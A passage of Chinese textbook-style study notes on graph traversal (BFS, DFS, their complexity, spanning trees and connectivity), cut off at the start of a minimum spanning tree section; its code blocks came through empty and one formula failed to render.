<p>换句话说，广度优先搜索遍历图的过程是以 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 为起始点，由近至远依次访问和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 有路径相通且路径长度为 <code>1, 2, ...</code> 的顶点。广度优先搜索是一种分层的查找过程，每向前走一步可能访问一批顶点，不像深度优先搜索那样有往回退的情况，因此它不是一个递归的算法。为了实现逐层的访问，算法必须借助一个辅助队列，以记忆正在访问的顶点的下一层顶点。</p>
<p>广度优先搜索算法的伪代码如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>辅助数组 <code>visited[]</code> 标志顶点是否被访问过，其初始状态为 <code>FALSE</code>。在图的遍历过程中，一旦某个顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，被访问，就立即置 <code>visited[i]</code> 为 <code>TRUE</code>，防止它被多次访问。</p>
<p>图的广度优先搜索的过程与二叉树的层序遍历是完全一致的，这也说明了图的广度优先搜索遍历算法是二叉树的层次遍历算法的扩展。</p>
<ol>
<li>
<p><strong>BFS 算法的性能分析</strong></p>
<p>无论是邻接表还是邻接矩阵的存储方式，BFS 算法都需要借助一个辅助队列 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个顶点均需入队一次，在最坏的情况下，空间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi mathvariant="normal">∣</mi><mi>v</mi><mi mathvariant="normal">∣</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(|v|)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord">∣</span><span class="mclose">)</span></span></span></span>。</p>
<p>采用邻接表存储方式时，每个顶点均需搜索一次（或入队一次），故时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi mathvariant="normal">∣</mi><mi>V</mi><mi mathvariant="normal">∣</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(|V|)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord">∣</span><span class="mclose">)</span></span></span></span>，在搜索任意一个顶点的邻接点时，每条边至少访问一次，故时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi mathvariant="normal">∣</mi><mi>E</mi><mi mathvariant="normal">∣</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(|E|)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span><span class="mclose">)</span></span></span></span>，算法总的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi mathvariant="normal">∣</mi><mi>V</mi><mi mathvariant="normal">∣</mi><mo>+</mo><mi mathvariant="normal">∣</mi><mi>E</mi><mi mathvariant="normal">∣</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(|V| + |E|)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span><span class="mclose">)</span></span></span></span>。采用邻接矩阵存储方式时，查找每个顶点的邻接点所需的时间为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi mathvariant="normal">∣</mi><mi>V</mi><mi mathvariant="normal">∣</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(|V|)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord">∣</span><span class="mclose">)</span></span></span></span>，故算法总的时间复杂度为 <span class="katex-error" title="ParseError: KaTeX parse error: Expected group after '^' at position 6: O(|V|^̲_{2})" style="color:#cc0000">O(|V|^_{2})</span>。</p>
</li>
<li>
<p><strong>BFS 算法求解单源最短路径问题</strong></p>
<p>若图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mo>=</mo><mo stretchy="false">(</mo><mi>V</mi><mo separator="true">,</mo><mi>E</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">G = (V, E)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mclose">)</span></span></span></span> 为非带权图，定义从顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi></mrow><annotation encoding="application/x-tex">u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">u</span></span></span></span> 到顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 的最短路径 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo stretchy="false">(</mo><mi>u</mi><mo separator="true">,</mo><mi>v</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">d(u, v)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span></span></span></span> 为从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi></mrow><annotation encoding="application/x-tex">u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">u</span></span></span></span> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 的任何路径中最少的边数；若从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi></mrow><annotation encoding="application/x-tex">u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">u</span></span></span></span> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 没有通路，则 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo stretchy="false">(</mo><mi>u</mi><mo separator="true">,</mo><mi>v</mi><mo stretchy="false">)</mo><mo>=</mo><mi mathvariant="normal">∞</mi></mrow><annotation encoding="application/x-tex">d(u, v) = \infty</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord">∞</span></span></span></span>。</p>
<p>使用 BFS，可以求解一个满足上述定义的非带权图的单源最短路径问题，这是由广度优先搜索总是按照距离由近到远来遍历图中每个顶点的性质决定的。</p>
<p>BFS 算法求解单源最短路径问题的算法如下:</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p><strong>广度优先生成树</strong></p>
<p>在广度遍历的过程中，可以得到一棵遍历树，称为 <strong>广度优先生成树</strong>。需要注意的是，同一个图的邻接矩阵存储表示是唯一的，故其广度优先生成树也是唯一的，但由于邻接表存储表示不唯一，故其广度优先生成树也是不唯一的。</p>
</li>
</ol>
<h4> 深度优先搜索素</h4>
<p>与广度优先搜索不同，深度优先搜索（Depth-First-Search, DFS）类似于树的先序遍历。如其名称中所暗含的意思一样，这种搜索算法所遵循的搜索策略是尽可能 “深” 地搜索一个图。</p>
<p>它的 <strong>基本思想</strong> 如下：首先访问图中某一起始顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span>，然后由 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 出发，访问与 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 邻接且未被访问的任意一个顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">w_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，再访问与 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">w_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 邻接且未被访问的任意一个顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">w_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ……重复上述过程。当不能再继续向下访问时，依次退回到最近被访问的顶点，若它还有邻接顶点未被访问过，则从该点开始继续上述搜索过程，直至图中所有顶点均被访问过为止。</p>
<p>一般情况下，其递归形式的算法十分简洁，算法过程如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>图的邻接矩阵表示是唯一的，但对于邻接表来说，若边的输入次序不同，生成的邻接表也不同。因此，对于同样一个图，基于邻接矩阵的遍历所得到的 DFS 序列和 BFS 序列是唯一的，基于邻接表的遍历所得到的 DFS 序列和 BFS 序列是不唯一的</p>
</div>
<ol>
<li>
<p><strong>DFS 算法的性能分析</strong></p>
<p>DFS 算法是一个递归算法，需要借助一个递归工作栈，故其空间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi mathvariant="normal">∣</mi><mi>V</mi><mi mathvariant="normal">∣</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(|V|)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord">∣</span><span class="mclose">)</span></span></span></span>。</p>
<p>遍历图的过程实质上是对每个顶点查找其邻接点的过程，其耗费的时间取决于所用的存储结构。以邻接矩阵表示时，查找每个顶点的邻接点所需的时间为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi mathvariant="normal">∣</mi><mi>V</mi><mi mathvariant="normal">∣</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(|V|)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord">∣</span><span class="mclose">)</span></span></span></span>，故总的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi mathvariant="normal">∣</mi><mi>V</mi><msup><mi mathvariant="normal">∣</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(|V|^{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。以邻接表表示时，查找所有顶点的邻接点所需的时间为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi mathvariant="normal">∣</mi><mi>E</mi><mi mathvariant="normal">∣</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(|E|)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span><span class="mclose">)</span></span></span></span>，访问顶点所需的时间为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi mathvariant="normal">∣</mi><mi>V</mi><mi mathvariant="normal">∣</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(|V|)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord">∣</span><span class="mclose">)</span></span></span></span>，此时，总的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi mathvariant="normal">∣</mi><mi>V</mi><mi mathvariant="normal">∣</mi><mo>+</mo><mi mathvariant="normal">∣</mi><mi>E</mi><mi mathvariant="normal">∣</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(|V| + |E|)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span><span class="mclose">)</span></span></span></span>。</p>
</li>
<li>
<p><strong>深度优先的生成树和生成森林</strong></p>
<p>与广度优先搜索一样，深度优先搜索也会产生一棵深度优先生成树。当然，这是有条件的，即对连通图调用 DFS 才能产生深度优先生成树，否则产生的将是深度优先生成森林。与 BFS 类似，基于邻接表存储的深度优先生成树是不唯一的。</p>
</li>
</ol>
<h4> 图的遍历与图的连通性</h4>
<p>图的遍历算法可以用来判断图的连通性。</p>
<p>对于无向图来说，若无向图是连通的，则从任意一个结点出发，仅需一次遍历就能够访问图中的所有顶点；若无向图是非连通的，则从某一个顶点出发，一次遍历只能访问到该顶点所在连通分量的所有顶点，而对于图中其他连通分量的顶点，则无法通过这次遍历访问。对于有向图来说，若从初始点到图中的每个顶点都有路径，则能够访问到图中的所有顶点，否则不能访问到所有顶点。</p>
<p>故在 <code>BFSTraverse()</code> 或 <code>DFSTraverse()</code> 中添加了第二个 <code>for</code> 循环，再选取初始点，继续进行遍历，以防止一次无法遍历图的所有顶点。对于无向图，上述两个函数调用 <code>BFS(G, i)</code> 或 <code>DFS(G, i)</code> 的次数等于该图的连通分量数；而对于有向图则不是这样，因为一个连通的有向图分为强连通的和非强连通的，它的连通子图也分为强连通分量和非强连通分量，非强连通分量一次调用 <code>BFS(G, i)</code> 或 <code>DFS(G, i)</code> 无法访问到该连通分量的所有顶点。</p>
<h3> 图的应用</h3>
<p>图的应用主要包括：最小生成（代价）树、最短路径、拓扑排序和关键路径。</p>
<h4> 最小生成树</h4>
<p>一个连通图的生成树包含图的所有顶点，并且只含尽可能少的边。对于生成树来说，若砍去它的一条边，则会使生成树变成非连通图；若给它增加一条边，则会形成图中的一条回路。</p>
<p>对于一个带权连通无向图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mo>=</mo><mo stretchy="false">(</mo><mi>K</mi><mo separator="true">,</mo><mi>E</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">G = (K, E)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mclose">)</span></span></span></span>，生成树不同，每棵树的权（即树中所有边上的权值之和）也可能不同。设 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">ℜ</mi></mrow><annotation encoding="application/x-tex">\Re</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">ℜ</span></span></span></span> 为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 的所有生成树的集合，若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span> 为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">ℜ</mi></mrow><annotation encoding="application/x-tex">\Re</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">ℜ</span></span></span></span> 中边的权值之和最小的那棵生成树，则 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span> 称为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 的最小生成树（Minimum-Spanning-Tree, MST）。</p>
<p>不难看出，<strong>最小生成树具有如下性质:</strong></p>
<ul>
<li>最小生成树不是唯一的，即最小生成树的树形不唯一，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">ℜ</mi></mrow><annotation encoding="application/x-tex">\Re</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">ℜ</span></span></span></span> 中可能有多个最小生成树。当图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 中的各边权值互不相等时，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 的最小生成树是唯一的；若无向连通图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation 